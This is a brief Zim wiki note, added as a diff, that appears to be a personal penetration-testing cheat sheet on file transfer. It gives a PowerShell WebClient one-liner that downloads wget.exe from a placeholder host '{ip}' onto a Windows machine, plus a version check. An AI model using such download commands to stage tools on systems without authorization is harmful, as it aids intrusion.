@@ -1,0 +1,9 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-19T13:13:17-04:00
+
+====== file transfer ======
+Created Tuesday 19 May 2020
+
+* powershell -c "(new-object System.Net.WebClient).DownloadFile('http://{ip}/wget.exe','C:\Users\test\wget.exe')"
+* wget.exe -V   {shows version}
